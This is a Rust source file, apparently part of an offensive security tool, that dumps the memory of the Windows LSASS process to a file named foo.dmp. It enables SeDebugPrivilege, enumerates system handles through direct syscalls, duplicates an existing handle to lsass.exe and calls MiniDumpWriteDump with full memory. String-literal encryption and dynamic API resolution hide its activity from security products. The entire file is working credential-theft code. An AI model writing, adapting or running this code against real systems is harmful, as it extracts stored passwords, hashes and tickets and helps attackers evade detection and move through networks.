#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use litcrypt::lc;
use core::panic;
use std::{mem::size_of, ptr};
use bindings::Windows::Win32::{Foundation::HANDLE, Security::SECURITY_ATTRIBUTES, System::{Threading::GetCurrentProcess, WindowsProgramming::{PUBLIC_OBJECT_TYPE_INFORMATION}}};
use data::{CreateFileA, GENERIC_ALL, MiniDumpWriteDump, NtDuplicateObject, NtQueryObject, NtQuerySystemInformation, PVOID, QueryFullProcessImageNameW, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO};
use dinvoke::open_process;

pub fn dump() {

    unsafe 
    {
        let privilege: u32 = 20; 
        let enable: u8 = 1; 
        let current_thread: u8 = 0;
        let enabled: *mut u8 = std::mem::transmute(&u8::default()); 
       
        //Enable SeDebugPrivilee
        let r = dinvoke::rtl_adjust_privilege(privilege,enable,current_thread,enabled);

        if r != 0 
        {
            panic!("{}",&lc!("[x] SeDebugPrivilege could not be enabled."));
        }
        else 
        {
            println!("{}", &lc!("[-] SeDebugPrivilege successfully enabled."));
        }

        let shi: *mut SYSTEM_HANDLE_INFORMATION;
        let mut ptr: PVOID;
        let mut buffer;
        let mut bytes = 2u32;
        let mut c = 0;

        loop
        { 
            buffer =  vec![0u8; bytes as usize];
            let mut ret: Option<i32>;
            let mut fun: NtQuerySystemInformation;
            ptr = std::mem::transmute(buffer.as_ptr());
            let bytes_ptr: *mut u32 = std::mem::transmute(&bytes);
            
            // Query the system looking for handles information
            dinvoke::execute_syscall!(&lc!("NtQuerySystemInformation"),fun,ret,16,ptr,bytes,bytes_ptr);

            match ret {
                Some(x) => 
                    if x != 0 
                    {
                        bytes = *bytes_ptr;
                    }
                    else
                    {
                        shi = std::mem::transmute(ptr);
                        break;
                    },
                None => { panic!("{}", &lc!("[x] Call to NtQuerySystemInformation failed."));}
            }

            c = c + 1;

            if c > 20
            {
                panic!("{}", &lc!("[x] Timeout. Call to NtQuerySystemInformation failed."));
            }
        }     
        
        println!("{}{}{}",&lc!("[-] Retrieved "), (*shi).number_of_handles, &lc!(" handles. Starting analysis..."));
        let mut shtei: *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO = std::mem::transmute(&(*shi).handles);
        for _x in 0..(*shi).number_of_handles 
        {

            if (*shtei).process_id > 4
            {
                // PROCESS_DUP_HANDLE as access right
                let handle = open_process(0x0040, 0, (*shtei).process_id as u32).unwrap();
                if handle.0 != 0 && handle.0 != -1
                {
                    let func_ptr: NtDuplicateObject;
                    let target = HANDLE {0: (*shtei).handle_value as isize};
                    let dup_handle: *mut HANDLE = std::mem::transmute(&HANDLE::default());
                    let ret: Option<i32>; 
                    // Duplicate handle in order to manipulate it
                    dinvoke::execute_syscall!(
                        &lc!("NtDuplicateObject"),
                        func_ptr,
                        ret,
                        handle,
                        target,
                        GetCurrentProcess(),
                        dup_handle,
                        0x0400|0x0010,
                        0,
                        0
                    );

                    match ret 
                    {
                        Some(x) =>
                            if x != 0 
                            {
                                shtei = shtei.add(1);
                                continue;
                            }
                        None => {shtei = shtei.add(1); continue},
                    }
                    

                    let poti = PUBLIC_OBJECT_TYPE_INFORMATION::default();
                    let poti_ptr: PVOID = std::mem::transmute(&poti);
                    let func_ptr: NtQueryObject;
                    let _ret: Option<i32>; 
                    let ret_lenght: *mut u32 = std::mem::transmute(&u32::default());

                    // We obtain information about the handle. Two calls to NtQueryObject are required in order to make it work.
                    dinvoke::execute_syscall!(
                        &lc!("NtQueryObject"),
                        func_ptr,
                        _ret,
                        *dup_handle,
                        2,
                        poti_ptr,
                        size_of::<PUBLIC_OBJECT_TYPE_INFORMATION>() as u32,
                        ret_lenght
                    );


                    let ret: Option<i32>;
                    let func_ptr: NtQueryObject;
                    let buffer = vec![0u8; *ret_lenght as usize];
                    let poti_ptr: PVOID = std::mem::transmute(buffer.as_ptr());
                    dinvoke::execute_syscall!(
                        &lc!("NtQueryObject"),
                        func_ptr,
                        ret,
                        *dup_handle,
                        2,
                        poti_ptr,
                        *ret_lenght,
                        ret_lenght
                    );

                    match ret 
                    {
                        Some(x) =>
                            if x != 0 
                            {
                                shtei = shtei.add(1);
                                continue;
                            }
                        None => {shtei = shtei.add(1); continue},
                    }

                    let poti_ptr: *mut PUBLIC_OBJECT_TYPE_INFORMATION = std::mem::transmute(poti_ptr);
                    let poti = *poti_ptr;
                    let mut type_name: String = "".to_string();
                    let mut buffer: *mut u8 = poti.TypeName.Buffer.0 as *mut u8;
                    for _i in 0..poti.TypeName.Length
                    {
                        if *buffer as char != '\0'
                        {
                            type_name.push(*buffer as char);
                        }
                        buffer = buffer.add(1);

                    }

                
                    // We have a process handle
                    if type_name.to_lowercase() == "process"
                    {
                        let kernel32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));

                        let len = 200usize; // I dont really think it exists a process image name longer than 200 characters
                        let buffer = vec![0u8; len];
                        let buffer: *mut u16 = std::mem::transmute(buffer.as_ptr());
                        let ret: Option<i32>; 
                        let func: QueryFullProcessImageNameW;
                        let ret_len: *mut u32 = std::mem::transmute(&len);
                        // We retrieve the full name of the executable image for the process owner of the duplicated handle
                        dinvoke::dynamic_invoke!(
                            kernel32,
                            &lc!("QueryFullProcessImageNameW"),
                            func,
                            ret,
                            *dup_handle,
                            0,
                            buffer,
                            ret_len
                        );

                        match ret {
                            Some(z) =>
                                if z == 0 
                                {
                                    shtei = shtei.add(1);
                                    continue;
                                }
                            None => {shtei = shtei.add(1); continue;},
                        }

                        let mut image_name: String = "".to_string();
                        let mut buffer: *mut u8 = std::mem::transmute(buffer);
                        for _i in 0..(*ret_len) * 2 // Each char is followed by \0. Lovely LPWSTR...
                        {
                            if *buffer as char != '\0' 
                            {
                                image_name.push(*buffer as char);
                            }
                            buffer = buffer.add(1);

                        }

                        // We have a valid process handled
                        if image_name.contains(&lc!("lsass.exe"))
                        {
                            let reti: Option<HANDLE>;
                            let mut dump ="f\0o\0o\0.\0d\0m\0p\0\0\0".to_string(); // This is the format expected by CreateFileW, each char followed by a null byte.
                            let dump_name = dump.as_mut_ptr();
                            let create_file: CreateFileA;
                            let desired_access = GENERIC_ALL;
                            let share_mode = 1u32 | 2u32;
                            let disposition = 2u32;
                            let attr: *const SECURITY_ATTRIBUTES = ptr::null();
                            let flags = 0x80; //FILE_ATTRIBUTE_NORMAL
                            let template = HANDLE{0: -1 as isize}; // Null HANDLE

                            // We create the file that will receive the dump
                            dinvoke::dynamic_invoke!(
                                kernel32,
                                &lc!("CreateFileW"),
                                create_file,
                                reti,
                                dump_name,
                                desired_access,
                                share_mode,
                                attr,
                                disposition,
                                flags,
                                template
                            );

                            let mut file_handle = HANDLE::default();
                            match  reti{
                                Some(z) => file_handle = z,
                                None => { panic!("{}", &lc!("[x] Error creating the dump file.")); },
                            };
                            
                            if file_handle.0 != -1
                            {        
                                let dbg = dinvoke::load_library_a(&lc!("Dbgcore.dll")).unwrap();
                      
                                let func: MiniDumpWriteDump;
                                let ret: Option<i32>;
                                // We use the duplicated handle to dump the process memory
                                dinvoke::dynamic_invoke!(
                                    dbg,
                                    &lc!("MiniDumpWriteDump"),
                                    func,
                                    ret,
                                    *dup_handle,
                                    0, // Process Id does not seem to be needed 
                                    file_handle,
                                    0x00000002, // MiniDumpWithFullMemory
                                    ptr::null_mut(),
                                    ptr::null_mut(),
                                    ptr::null_mut()
                                );

                                match ret {
                                    Some(x) => 
                                        if x == 1 
                                        {
                                            println!("{}",&lc!("[!] Lsass dump successfully created!")); 
                                            let _r = dinvoke::close_handle(file_handle).unwrap();
                                            break;
                                        },
                                    None => {},
                                }
                            }

                        }
                    }
                }
            }

            shtei = shtei.add(1);
        }            
    }

    println!("{}",&lc!("[x] Execution failed. Exiting."));
}